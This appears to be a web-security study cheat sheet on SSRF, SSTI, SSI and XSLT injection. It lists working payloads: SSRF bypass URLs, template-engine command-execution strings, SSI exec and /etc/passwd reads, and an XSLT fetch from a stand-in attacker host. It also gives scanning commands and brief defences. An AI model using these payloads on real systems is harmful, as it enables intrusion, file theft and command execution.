## 1. Server-Side Request Forgery (SSRF)

### Exploitation:

- **Internal port scanning**: Attempting to access internal services and ports on the server's localhost.
    
- **Accessing restricted endpoints**: Bypassing access controls to reach sensitive internal resources.
    

### Common Protocols for SSRF:

- `http://127.0.0.1/file:///etc/passwd` → Access local files.
    
- `gopher://dateserver.htb:80/...` → Use the gopher protocol to send arbitrary requests.
    
- `dict://127.0.0.1:11211/info` → Query dictionary services.
    
- `ftp://127.0.0.1:21` → Access FTP servers.
    
- `file://` → Access local files.
    
- `php://` → PHP stream wrappers (highly dangerous).
    
- `data://` → Data encoding.
    
- `https://` → Accessing internal HTTPS servers.
    

### Advanced SSRF Bypass Techniques:

- **URL Encoding**: `http://127.0.0.1%3A80`
    
- **Double Encoding**: `http://127.0.0.1%253A80`
    
- **Alternative IP Representations**:
    
    - **Octal**: `http://0177.0.0.1`
        
    - **Hexadecimal**: `http://0x7F.0x00.0x00.0x01`
        
    - **IPv6 Abuse**: `http://[::1]:80`
        
- **DNS Rebinding**: Change IP resolutions dynamically.
    
- **Varying Ports**: Bypass filters using different ports.
    

## 2. Server-Side Template Injection (SSTI)

### Identifying SSTI:

- **Test String**: `{{<%[%'"}}\.` → Identify templating engine.
    

### Exploiting SSTI by Templating Engine:

#### Jinja2 (Python)

```jinja
{{config.items()[4][1].__class__.__init__.__globals__['os'].popen('id').read()}}
```

#### Twig (PHP)

```twig
{{system('id')}}
```

#### Freemarker (Java)

```java
${new java.lang.ProcessBuilder("id").start()}
```

#### Velocity (Java)

```velocity
#set($e="e")#set($x=$e.class.forName("java.lang.Runtime").getRuntime().exec("id"))$x
```

#### Smarty (PHP)

```smarty
{${system('id')}}
```

#### Handlebars (JavaScript)

```handlebars
{{this.constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')()}}
```

### Blind SSTI:

- **Timing-based detection**:
    
    ```jinja
    {{ ''.__class__.__mro__[1].__subclasses__() }}
    ```
    
- **Out-of-Band SSTI Detection** (e.g., Burp Collaborator, interacting with external DNS services)
    

## 3. Server-Side Includes (SSI) Injection

### SSI Directives:

- Print environment variables: `<!--#echo var="HTTP_USER_AGENT" -->`
    
- Execute commands: `<!--#exec cmd="id" -->`
    
- Include files: `<!--#include file="/etc/passwd" -->`
    
- Modify error messages: `<!--#config errmsg="Hacked!" -->`
    

## 4. XSLT Injection

### Common XSLT Elements:

- `<xsl:template>` → Defines an XSL template.
    
- `<xsl:value-of>` → Extracts XML values.
    
- `<xsl:for-each>` → Loops through XML nodes.
    
- `<xsl:if>` → Tests conditions.
    

### XSLT Injection Payloads:

#### Information Disclosure:

```xml
<xsl:value-of select="system-property('xsl:version')" />
```

#### Local File Inclusion (LFI):

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

#### Remote Code Execution (RCE):

```xml
<xsl:value-of select="php:function('system','id')" />
```

### Advanced XSLT Exploits:

- **XXE via XSLT**: Using `document('http://attacker.com/payload.xml')` to retrieve malicious data.
    
- **Network SSRF via XSLT**: Fetching internal/external resources.
    

## 5. Fuzzing & Reconnaissance Tools

### Fuzzing with wfuzz:

```bash
wfuzz -c -z file,wordlist.txt http://target.com/FUZZ
```

### Port Scanning:

```bash
nmap -p 1-65535 target.com
```

### Web Server Scanning:

```bash
nikto -h target.com
```

### Directory Bruteforce:

```bash
gobuster dir -u target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

## 6. Defensive Measures

- **Input Validation**: Whitelist allowed values.
    
- **Output Encoding**: Prevent reflected output attacks.
    
- **Sandboxing & Isolation**: Reduce attack surface.
    
- **Web Application Firewalls (WAFs)**: Filter malicious traffic.
    
- **Least Privilege Principles**: Restrict server permissions.
    
- **Content Security Policy (CSP)**: Prevent SSRF & SSTI exploitation.
    
- **Error Handling Best Practices**:
    
    - Suppress detailed error messages.
        
    - Log errors securely without exposing them to users.
        

## 7. API Security Considerations

- **Prevent SSRF via Metadata Endpoints** (e.g., cloud environments like AWS/GCP metadata service).
    
- **Restrict Templating Engine Usage** to avoid unnecessary exposure.
    
- **Proper Authentication & Authorization** checks for sensitive actions.
    

## 8. Modern Web Architecture & Vulnerabilities

- **Microservices & Serverless Architectures**:
    
    - API Gateway-level validation.
        
    - Function-level permissions to minimize attack impact.
        
- **Container Security**:
    
    - Limit exposed ports.
        
    - Implement network segmentation.
        

---
